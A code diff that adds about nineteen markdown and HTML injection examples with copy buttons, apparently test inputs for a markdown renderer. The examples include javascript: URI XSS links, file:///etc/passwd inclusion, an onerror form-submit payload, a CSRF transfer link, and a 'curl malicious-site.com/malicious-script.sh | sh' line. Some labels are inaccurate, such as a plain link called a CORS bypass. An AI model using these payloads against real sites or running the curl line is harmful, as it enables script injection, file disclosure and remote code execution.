@@ -298,19 +298,6 @@ HTML is an abbreviation for *[HyperText Markup Language]*, and CSS stands for *[
 
 <div class="markdown-example">
     <div class="markdown-header">
-        <h2 style="margin: 0; color: #fff;">Superscript in Links</h2>
-    </div>
-
-    <div class="markdown-content">
-        <h3>Superscript in Links</h3>
-        <code id="superscriptLinks">This is a link with superscript<sup>1</sup>.</code>
-
-        <button class="copy-button" data-target="superscriptLinks" onclick="copyToClipboard('superscriptLinks')">Copy Code</button>
-    </div>
-</div>
-
-<div class="markdown-example">
-    <div class="markdown-header">
         <h2 style="margin: 0; color: #fff;">Strikethrough in Tables</h2>
     </div>
 
@@ -326,7 +313,279 @@ HTML is an abbreviation for *[HyperText Markup Language]*, and CSS stands for *[
     </div>
 </div>
 
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Script Execution</h2>
+    </div>
 
+    <div class="markdown-content">
+        <h3>Script Execution</h3>
+        <code id="scriptExecution">
+            ![Image](javascript:alert('Malicious Script'))
+        </code>
+
+        <button class="copy-button" data-target="scriptExecution" onclick="copyToClipboard('scriptExecution')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Cross-Site Scripting (XSS)</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Cross-Site Scripting (XSS)</h3>
+        <code id="xss">
+            [Click me](javascript:alert('XSS Attack'))
+        </code>
+
+        <button class="copy-button" data-target="xss" onclick="copyToClipboard('xss')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">External Resource Inclusion</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>External Resource Inclusion</h3>
+        <code id="externalResourceInclusion">
+            ![External Image](http://malicious-site.com/image.jpg)
+        </code>
+
+        <button class="copy-button" data-target="externalResourceInclusion" onclick="copyToClipboard('externalResourceInclusion')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">File Inclusion</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>File Inclusion</h3>
+        <code id="fileInclusion">
+            ![Include File](file:///etc/passwd)
+        </code>
+
+        <button class="copy-button" data-target="fileInclusion" onclick="copyToClipboard('fileInclusion')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Malformed Links with JavaScript</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Malformed Links with JavaScript</h3>
+        <code id="malformedLinks">
+            [Click me](javascript:alert('Malicious Script'))
+        </code>
+
+        <button class="copy-button" data-target="malformedLinks" onclick="copyToClipboard('malformedLinks')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">CSRF Token Manipulation</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>CSRF Token Manipulation</h3>
+        <code id="csrfTokenManipulation">
+            ![Image](http://malicious-site.com/image.jpg" onerror="document.forms[0].submit())
+        </code>
+
+        <button class="copy-button" data-target="csrfTokenManipulation" onclick="copyToClipboard('csrfTokenManipulation')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Remote Code Execution (RCE) through Shell Commands</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Remote Code Execution (RCE) through Shell Commands</h3>
+        <code id="rceShellCommands">
+            ```bash
+            ; curl malicious-site.com/malicious-script.sh | sh
+            ```
+        </code>
+
+        <button class="copy-button" data-target="rceShellCommands" onclick="copyToClipboard('rceShellCommands')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Cross-Origin Resource Sharing (CORS) Bypass</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Cross-Origin Resource Sharing (CORS) Bypass</h3>
+        <code id="corsBypass">
+            [Click me](https://trusted-site.com/api/data)
+        </code>
+
+        <button class="copy-button" data-target="corsBypass" onclick="copyToClipboard('corsBypass')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">JavaScript Execution in Inline Code</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>JavaScript Execution in Inline Code</h3>
+        <code id="jsExecutionInlineCode">
+            This is `javascript:alert('XSS Attack')` inline code.
+        </code>
+
+        <button class="copy-button" data-target="jsExecutionInlineCode" onclick="copyToClipboard('jsExecutionInlineCode')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Local File Inclusion</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Local File Inclusion</h3>
+        <code id="localFileInclusion">
+            [Include File](file:///etc/passwd)
+        </code>
+
+        <button class="copy-button" data-target="localFileInclusion" onclick="copyToClipboard('localFileInclusion')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Using Special Characters for Code Injection</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Using Special Characters for Code Injection</h3>
+        <code id="specialCharsCodeInjection">
+            ```python
+            import os
+            os.system("malicious command")
+            ```
+        </code>
+
+        <button class="copy-button" data-target="specialCharsCodeInjection" onclick="copyToClipboard('specialCharsCodeInjection')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Remote Resource Inclusion</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Remote Resource Inclusion</h3>
+        <code id="remoteResourceInclusion">![External Image](http://evil.com/malicious-image.jpg)</code>
+
+        <button class="copy-button" data-target="remoteResourceInclusion" onclick="copyToClipboard('remoteResourceInclusion')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Data URL Payloads</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Data URL Payloads</h3>
+        <code id="dataUrlPayloads">![Image](data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8sIFdvcmxkISIpPC9zY3JpcHQ+Cg==)</code>
+
+        <button class="copy-button" data-target="dataUrlPayloads" onclick="copyToClipboard('dataUrlPayloads')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Using javascript: in HREF</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Using javascript: in HREF</h3>
+        <code id="javascriptInHref">[Click me](javascript:alert('Click Event'))</code>
+
+        <button class="copy-button" data-target="javascriptInHref" onclick="copyToClipboard('javascriptInHref')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">XSS through Inline Styles</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>XSS through Inline Styles</h3>
+        <code id="xssInlineStyles"><span style="background-image: url(javascript:alert('XSS'))">Text</span></code>
+
+        <button class="copy-button" data-target="xssInlineStyles" onclick="copyToClipboard('xssInlineStyles')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">URL Redirection</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>URL Redirection</h3>
+        <code id="urlRedirection">[Click me](http://trusted-site.com/page?redirect=http://malicious-site.com)</code>
+
+        <button class="copy-button" data-target="urlRedirection" onclick="copyToClipboard('urlRedirection')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">CSRF Attack</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>CSRF Attack</h3>
+        <code id="csrfAttack">[Click me](https://target-site.com/transfer?amount=10000&to=attacker-account)</code>
+
+        <button class="copy-button" data-target="csrfAttack" onclick="copyToClipboard('csrfAttack')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Using JavaScript URIs</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Using JavaScript URIs</h3>
+        <code id="javascriptURIs">[Click me](javascript:window.location='http://malicious-site.com')</code>
+
+        <button class="copy-button" data-target="javascriptURIs" onclick="copyToClipboard('javascriptURIs')">Copy Code</button>
+    </div>
+</div>
+
+<div class="markdown-example">
+    <div class="markdown-header">
+        <h2 style="margin: 0; color: #fff;">Inline Math Blocks</h2>
+    </div>
+
+    <div class="markdown-content">
+        <h3>Executing Code in Inline Math Blocks</h3>
+        <code id="inlineMathBlocks">$ \scriptsize{\text{alert('XSS Attack')}} $</code>
+
+        <button class="copy-button" data-target="inlineMathBlocks" onclick="copyToClipboard('inlineMathBlocks')">Copy Code</button>
+    </div>
+</div>
 
 <!-- Add more examples here following the same structure -->
 
